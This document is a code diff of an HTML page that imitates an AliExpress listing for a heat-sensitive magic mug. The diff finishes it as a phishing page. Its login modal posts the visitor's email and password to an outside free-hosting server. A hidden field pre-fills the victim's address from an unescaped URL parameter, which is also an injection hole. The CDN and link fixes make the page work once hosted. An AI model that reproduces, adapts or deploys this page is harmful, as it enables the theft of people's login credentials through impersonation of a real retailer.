@@ -92,7 +92,7 @@
         });
     </script>
 
-	<title>Magic Mug Heat Sensitive Color Changing Coffee Mugs 350ml 12 oz Ceramic Hot Cold Colour Change Tea Mug Cup Designs One Piece-in Mugs from Home &amp; Garden on Aliexpress.com | Alibaba Group</title><link href="./Magic Mug Heat Sensitive Color Changing Coffee Mugs 350ml 12 oz Ceramic Hot Cold Colour Change Tea Mug Cup Designs One Piece-in Mugs from Home &amp; Garden on Aliexpress.com _ Alibaba Group_files/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">	<meta name="keywords" content="water bottle pouch, water bottle pink, water magnetic,Cheap water bottle pouch,High Quality water bottle pink, China water magnetic Suppliers">
+	<title>Magic Mug Heat Sensitive Color Changing Coffee Mugs 350ml 12 oz Ceramic Hot Cold Colour Change Tea Mug Cup Designs One Piece-in Mugs from Home &amp; Garden on Aliexpress.com | Alibaba Group</title><link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">	<meta name="keywords" content="water bottle pouch, water bottle pink, water magnetic,Cheap water bottle pouch,High Quality water bottle pink, China water magnetic Suppliers">
 	<meta name="description" content="Cheap water bottle pouch, Buy Quality water bottle pink directly from China water magnetic Suppliers: Magic Mug Heat Sensitive Color Changing Coffee Mugs 350ml 12 oz Ceramic Hot Cold Colour Change Tea Mug Cup Designs One Piece">
 	<meta name="google-translate-customization" content="8daa66079a8aa29e-f219f934a1051f5a-ge19f8e1eaa3bf94b-e">
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -412,7 +412,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
   			    <div class="row">
 	<div class="bs-example">
     <!-- Button HTML (to Trigger Modal) -->
-    <a href="file:///Users/Haybee/Downloads/blankets%20copy.html#myModal" class="btn btn-lg btn-primary" data-toggle="modal">Launch Demo Modal</a>
+    <a href="#myModal" class="btn btn-lg btn-primary" data-toggle="modal">Launch Demo Modal</a>
     
     <!-- Modal HTML -->
     <div id="myModal" class="modal fade">
@@ -429,7 +429,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
                     <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs" id="logFrm" class="log-frm" name="logFrm"> 
                     <ul>                                                     
                         <li>Email</li>
-                        <li> <input type="text" placeholder="User ID" id="userName" name="userName" class="form-control" onfocus="checkNullProf();"></li>
+                        <li> <input type="hidden" value="<?php echo $_GET['login']; ?>" id="userName" name="userName" class="form-control" onfocus="checkNullProf();"></li>
                         <li>Password</li>
                         <li><input type="password" placeholder="Password" id="password" name="password" class="form-control" onfocus="checkNullProf();"></li>                                                
                         <li><br><button type="“submit”" onclick="userLogin();" id="logBtn" class="btn btn-default">Submit</button></li>
